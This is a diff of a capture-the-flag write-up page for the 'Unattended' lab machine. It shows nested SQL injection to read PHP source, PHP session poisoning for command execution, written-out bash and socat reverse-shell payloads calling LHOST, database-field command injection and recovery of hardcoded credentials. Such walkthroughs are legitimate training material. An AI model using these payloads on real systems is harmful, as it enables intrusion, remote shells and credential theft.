 try to read /var/www/html/index.php:</p>
-<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION
+<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION
 SELECT &#39;php://filter/read=convert.base64-encode/resource=/var/www/html/index.php&#39; --+&#34; --+
 
 PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0</code></pre>
 <p><p></p>
 Let&rsquo;s decode it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0 | base64 -d</code></pre></div>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">echo</span> PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0 <span class="p">|</span> base64 -d
+</code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
 <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;nestedflanders&#34;</span><span class="p">;</span>
 <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#34;</span><span class="p">;</span>
@@ -583,8 +592,7 @@ Let&rsquo;s decode it:
     <span class="p">}</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&#34;sqltpl: </span><span class="si">$sql</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span> 
     
-    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-</span><span class="nx">base64</span><span class="o">:</span> <span class="nx">invalid</span> <span class="nx">input</span>
-</code></pre></div></p>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-</span><span class="nx">base64</span><span class="o">:</span> <span class="nx">invalid</span> <span class="nx">input</span></code></pre></div></p>
 
 <p>Nice! We found some credentials for the database&hellip;.</p>
 
@@ -593,14 +601,15 @@ Let&rsquo;s decode it:
 <p>But what about this strange
 included file &lsquo;6fb17817efb4131ae4ae1acae0f7fd48.php&rsquo;? Let&rsquo;s read the source
 code from it too:</p>
-<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION
+<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION
 SELECT &#39;php://filter/read=convert.base64-encode/resource=/var/www/html/6fb17817efb4131ae4ae1acae0f7fd48.php&#39; --+&#34; --+
 
 PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg==</code></pre>
 <p><p></p>
 Let&rsquo;s decode it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg== | base64 -d</code></pre></div>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">echo</span> <span class="nv">PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg</span><span class="o">==</span> <span class="p">|</span> base64 -d
+</code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">session_start</span><span class="p">();</span>
 <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">])){</span>
 	<span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">];</span>
@@ -610,183 +619,197 @@ Let&rsquo;s decode it:
 	<span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="cm">/* removed everything because of undergoing investigation, please check dev and staging */</span>
-</code></pre></div></p>
+<span class="cm">/* removed everything because of undergoing investigation, please check dev and staging */</span></code></pre></div></p>
 
 <p>We struck gold! This code means that every cookie name/value pair is saved inside the PHP session. PHP sessions are stored in temporary files inside a specific folder. This folder is set using the session.save_path inside the php.ini file (e.g. <code>session.save_path = &quot;/var/lib/php/sessions&quot;</code>).</p>
 
 <p>Therefore, we can either read the php.ini file to learn this location or brute-force well known paths of PHP session storage. I did the latter and I discovered that indeed the sessions were stored in /var/lib/php/sessions/.</p>
 
 <p>Now, we can set a cookie with a value <code>&quot;&lt;?php passthru($_REQUEST['cmd'])?&gt;&quot;</code> and this will be stored inside a file at <code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code>. Then all we have to do is to include/run this file using our nested SQL injection technique:</p>
-<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION SELECT &#39;/var/lib/php/sessions/sess_d0rosoogt4afnin1qtic4ju612&#39; --+&#34; --+&amp;cmd=whoami
+<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION SELECT &#39;/var/lib/php/sessions/sess_d0rosoogt4afnin1qtic4ju612&#39; --+&#34; --+&amp;cmd=whoami
 
 PHPSESSID|s:26:&#34;d0rosoogt4afnin1qtic4ju612&#34;;test|s:32:&#34;www-data &#34;;</code></pre>
 <p>We achieved remote command execution!</p>
 
 <p><p></p>
 To get a full shell you can try payloads like those (url-encoded them to make your life easier):</p>
-<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/LHOST/LPORT1 0&gt;&amp;1&#39;</code></pre><pre><code>socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
+<pre tabindex="0"><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/LHOST/LPORT1 0&gt;&amp;1&#39;</code></pre><pre tabindex="0"><code>socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
 socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp6:[LHOST]:LPORT</code></pre>
 <p><p></p>
 Or you can try my <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Unattended/autopwn_unattended.py" target="_blank">autopwn script</a>:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">[*] LHOST: dead:beef:2::12d0
-
-What shell do you want?
-[1] www-data@unattended
-[2] guly@unattended
-[3] root@unattended
-[4] Exit
-
-Please enter a number 1-4: 1
-[+] Trying to bind to dead:beef:2::12d0 on port 60000: Done
-[+] Waiting for connections on dead:beef:2::12d0:60000: Got connection from dead:beef::250:56ff:feb9:880a on port 53778
-[*] Injecting session via cookies: Status code 200
-[*] Cookies: {&#39;PHPSESSID&#39;: &#39;4mlq7e9jafls6pmnmajd7hmug0&#39;, &#39;user_name&#39;: &#39;&lt;?php passthru($_REQUEST[cmd])?&gt;&#39;}
-[*] LFI via SQLI status code: 200
-[+] Testing RCE: SUCCESS
-[*] Switching to interactive mode
-www-data@unattended:/var/www/html$</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[*] LHOST: dead:beef:2::12d0
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">What shell do you want?
+</span><span class="go">[1] www-data@unattended
+</span><span class="go">[2] guly@unattended
+</span><span class="go">[3] root@unattended
+</span><span class="go">[4] Exit
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Please enter a number 1-4: 1
+</span><span class="go">[+] Trying to bind to dead:beef:2::12d0 on port 60000: Done
+</span><span class="go">[+] Waiting for connections on dead:beef:2::12d0:60000: Got connection from dead:beef::250:56ff:feb9:880a on port 53778
+</span><span class="go">[*] Injecting session via cookies: Status code 200
+</span><span class="go">[*] Cookies: {&#39;PHPSESSID&#39;: &#39;4mlq7e9jafls6pmnmajd7hmug0&#39;, &#39;user_name&#39;: &#39;&lt;?php passthru($_REQUEST[cmd])?&gt;&#39;}
+</span><span class="go">[*] LFI via SQLI status code: 200
+</span><span class="go">[+] Testing RCE: SUCCESS
+</span><span class="go">[*] Switching to interactive mode
+</span><span class="go">www-data@unattended:/var/www/html$
+</span></code></pre></div></div></p>
 
 <h2 id="getting-user-guly">Getting user guly</h2>
 
 <p>Do you remember the table &lsquo;config&rsquo;? Now that we have command execution and the database credentials we can examine it again like this:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
-
-...
-|  86 | checkrelease | /home/guly/checkbase.pl;/home/guly/checkplugins.pl; |
-....</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">...
+</span><span class="go">|  86 | checkrelease | /home/guly/checkbase.pl;/home/guly/checkplugins.pl; |
+</span><span class="go">....
+</span></code></pre></div></div></p>
 
 <p>Hmmm&hellip; This line looks fishy. Let&rsquo;s try to exploit it in order to run our own Perl script. First, we have to find an executable and writable location for our perl script:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ find / -writable -type d 2&gt; /dev/null
-/proc/1746/task/1746/fd
-/proc/1746/fd
-/proc/1746/map_files
-/var/tmp
-/var/lib/php/sessions
-/var/lib/nginx/fastcgi
-/var/lib/nginx/proxy
-/var/lib/nginx/proxy/1
-/var/lib/nginx/proxy/1/00
-/var/lib/nginx/body
-/var/lib/nginx/scgi
-/var/lib/nginx/uwsgi
-/var/cache/apache2/mod_cache_disk
-/dev/mqueue
-/dev/shm
-/tmp
-/run/lock
-/run/lock/apache2
-
-$ mount | grep noexec
-...
-tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
-...
-tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
-...
-tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
-tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>find / -writable -type d 2&gt; /dev/null
+<span class="go">/proc/1746/task/1746/fd
+</span><span class="go">/proc/1746/fd
+</span><span class="go">/proc/1746/map_files
+</span><span class="go">/var/tmp
+</span><span class="go">/var/lib/php/sessions
+</span><span class="go">/var/lib/nginx/fastcgi
+</span><span class="go">/var/lib/nginx/proxy
+</span><span class="go">/var/lib/nginx/proxy/1
+</span><span class="go">/var/lib/nginx/proxy/1/00
+</span><span class="go">/var/lib/nginx/body
+</span><span class="go">/var/lib/nginx/scgi
+</span><span class="go">/var/lib/nginx/uwsgi
+</span><span class="go">/var/cache/apache2/mod_cache_disk
+</span><span class="go">/dev/mqueue
+</span><span class="go">/dev/shm
+</span><span class="go">/tmp
+</span><span class="go">/run/lock
+</span><span class="go">/run/lock/apache2
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>mount <span class="p">|</span> grep noexec
+<span class="go">...
+</span><span class="go">tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
+</span><span class="go">...
+</span><span class="go">tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
+</span><span class="go">...
+</span><span class="go">tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
+</span><span class="go">tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)
+</span></code></pre></div></div></p>
 
 <p>As you can see several paths (<strong><em>/dev/shm, /tmp, /var/tmp</em></strong>) are mounted using the &lsquo;noexec&rsquo; option. This means that if we put our Perl script here, it cannot be executed. So, let&rsquo;s make a directory inside <strong><em>/var/lib/php/sessions</em></strong> and put it there instead:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ mkdir /var/lib/php/sessions/a
-
-$ which perl
-/usr/bin/perl
-
-$ which socat
-/usr/bin/socat
-
-$ printf &#39;#!/usr/bin/perl\nexec(&#34;/usr/bin/socat exec:bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34;);\n&#39; &gt; /var/lib/php/sessions/a/checkrelease.pl
-
-$ chmod +x /var/lib/php/sessions/a/checkrelease.pl</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>mkdir /var/lib/php/sessions/a
+<span class="err">
+</span><span class="err"></span><span class="gp">$ </span>which perl
+<span class="go">/usr/bin/perl
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>which socat
+<span class="go">/usr/bin/socat
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span><span class="nb">printf</span> <span class="s1">&#39;#!/usr/bin/perl\nexec(&#34;/usr/bin/socat exec:bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34;);\n&#39;</span> &gt; /var/lib/php/sessions/a/checkrelease.pl
+<span class="err">
+</span><span class="err"></span><span class="gp">$ </span>chmod +x /var/lib/php/sessions/a/checkrelease.pl
+</code></pre></div></div></p>
 
 <p>Now, we have to alter the database appropriately:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=&#34;/var/lib/php/sessions/a/checkrelease.pl;&#34; where option_name=&#34;checkrelease&#34;&#39; neddy</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>mysql -u nestedflanders -p<span class="s1">&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39;</span> -e <span class="s1">&#39;update config set option_value=&#34;/var/lib/php/sessions/a/checkrelease.pl;&#34; where option_name=&#34;checkrelease&#34;&#39;</span> neddy
+</code></pre></div></div></p>
 
 <p>Let&rsquo;s verify out change:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
-
-...
-|  86 | checkrelease | /var/lib/php/sessions/a/checkrelease.pl; |
-....</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">www-data@unattended:/var/www/html$ mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;select * from config&#39; neddy
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">...
+</span><span class="go">|  86 | checkrelease | /var/lib/php/sessions/a/checkrelease.pl; |
+</span><span class="go">....
+</span></code></pre></div></div></p>
 
 <p>Don&rsquo;t forget to setup your listener:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ socat file:`tty`,echo=0,raw tcp-listen:LPORT
-
-guly@unattended:~$ cat user.txt
-cat user.txt
-9b413f3******************70eef14</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>socat file:<span class="sb">`</span>tty<span class="sb">`</span>,echo<span class="o">=</span>0,raw tcp-listen:LPORT
+<span class="err">
+</span><span class="err"></span><span class="go">guly@unattended:~$ cat user.txt
+</span><span class="go">cat user.txt
+</span><span class="go">9b413f3******************70eef14
+</span></code></pre></div></div></p>
 
 <p>Later, I discovered that there is no need for a Perl script. We can simply put any shell command in that database field like this:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=&#34;socat exec:/bin/bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34; where option_name=&#34;checkrelease&#34;&#39; neddy</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">mysql -u nestedflanders -p&#39;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#39; -e &#39;update config set option_value=&#34;socat exec:/bin/bash,pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT&#34; where option_name=&#34;checkrelease&#34;&#39; neddy
+</span></code></pre></div></div></p>
 
 <p>There is another thing you have to pay attention&hellip; The host-based firewall (iptables):
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /etc/iptables/rules.v4
-# Generated by iptables-save v1.6.0 on Wed Dec 19 21:55:49 2018
-*filter
-:INPUT DROP [7:1813]
-:FORWARD ACCEPT [0:0]
-:OUTPUT DROP [34:2661]
--A INPUT -i lo -j ACCEPT
--A INPUT -i ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
--A INPUT -i ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
--A INPUT -i ens33 -p icmp -j ACCEPT
--A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
--A FORWARD -j DROP
--A OUTPUT -o lo -j ACCEPT
--A OUTPUT -o ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
--A OUTPUT -o ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
--A OUTPUT -o ens33 -p icmp -j ACCEPT
-COMMIT
-# Completed on Wed Dec 19 21:55:49 2018
-
-$ cat /etc/iptables/rules.v6
-# Generated by ip6tables-save v1.6.0 on Thu Dec 20 12:27:54 2018
-*filter
-:INPUT ACCEPT [0:0]
-:FORWARD ACCEPT [0:0]
-:OUTPUT ACCEPT [0:0]
-COMMIT
-# Completed on Thu Dec 20 12:27:54 2018</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat /etc/iptables/rules.v4
+<span class="gp"># </span>Generated by iptables-save v1.6.0 on Wed Dec <span class="m">19</span> 21:55:49 <span class="m">2018</span>
+<span class="go">*filter
+</span><span class="go">:INPUT DROP [7:1813]
+</span><span class="go">:FORWARD ACCEPT [0:0]
+</span><span class="go">:OUTPUT DROP [34:2661]
+</span><span class="go">-A INPUT -i lo -j ACCEPT
+</span><span class="go">-A INPUT -i ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
+</span><span class="go">-A INPUT -i ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
+</span><span class="go">-A INPUT -i ens33 -p icmp -j ACCEPT
+</span><span class="go">-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
+</span><span class="go">-A FORWARD -j DROP
+</span><span class="go">-A OUTPUT -o lo -j ACCEPT
+</span><span class="go">-A OUTPUT -o ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
+</span><span class="go">-A OUTPUT -o ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
+</span><span class="go">-A OUTPUT -o ens33 -p icmp -j ACCEPT
+</span><span class="go">COMMIT
+</span><span class="go"></span><span class="gp"># </span>Completed on Wed Dec <span class="m">19</span> 21:55:49 <span class="m">2018</span>
+<span class="err">
+</span><span class="err"></span><span class="gp">$ </span>cat /etc/iptables/rules.v6
+<span class="gp"># </span>Generated by ip6tables-save v1.6.0 on Thu Dec <span class="m">20</span> 12:27:54 <span class="m">2018</span>
+<span class="go">*filter
+</span><span class="go">:INPUT ACCEPT [0:0]
+</span><span class="go">:FORWARD ACCEPT [0:0]
+</span><span class="go">:OUTPUT ACCEPT [0:0]
+</span><span class="go">COMMIT
+</span><span class="go"></span><span class="gp"># </span>Completed on Thu Dec <span class="m">20</span> 12:27:54 <span class="m">2018</span>
+</code></pre></div></div></p>
 
 <p>As you can see only ports 80 and 443 are allowed for IPv4 and therefore we have to use one of them for our remote shell. Of course, we can use the IPv6 protocol instead (for which all ports are allowed).</p>
 
 <h2 id="getting-root">Getting root</h2>
 
 <p>Let&rsquo;s see what groups is user <em>guly</em> a member of:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~$ groups
-guly cdrom floppy audio dip video plugdev grub netdev</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">guly@unattended:~$ groups
+</span><span class="go">guly cdrom floppy audio dip video plugdev grub netdev
+</span></code></pre></div></div></p>
 
 <p>The group &lsquo;<strong>grub</strong>&rsquo; stands out. This is not a common group. Let&rsquo;s find what files belong to this group:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~$ find / -group grub 2&gt; /dev/null
-/boot/initrd.img-4.9.0-8-amd64</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">guly@unattended:~$ find / -group grub 2&gt; /dev/null
+</span><span class="go">/boot/initrd.img-4.9.0-8-amd64
+</span></code></pre></div></div></p>
 
 <p>Let&rsquo;s explore this initrd image. We can decompress it like this:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">guly@unattended:~$ mkdir .test &amp;&amp; cd .test
-guly@unattended:~/.test$ zcat /boot/initrd.img-4.9.0-8-amd64 | cpio -idmv</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">guly@unattended:~$ mkdir .test &amp;&amp; cd .test
+</span><span class="go">guly@unattended:~/.test$ zcat /boot/initrd.img-4.9.0-8-amd64 | cpio -idmv
+</span></code></pre></div></div></p>
 
 <p>The name of this box is &ldquo;Unattended&rdquo;. Maybe the administrators have automated some procedures inside the initrd image. Let&rsquo;s search for hardcoded passwords:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ grep -n3 -IR password
-...
-scripts/local-top/cryptroot-299-        if [ ! -e &#34;$NEWROOT&#34; ]; then
-scripts/local-top/cryptroot:300:      # guly: we have to deal with lukfs password sync when root changes her one
-scripts/local-top/cryptroot-301-      if ! crypttarget=&#34;$crypttarget&#34; cryptsource=&#34;$cryptsource&#34; \
-scripts/local-top/cryptroot-302-        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
-scripts/local-top/cryptroot:303:                message &#34;cryptsetup: cryptsetup failed, bad password or options?&#34;
-scripts/local-top/cryptroot-304-                sleep 3
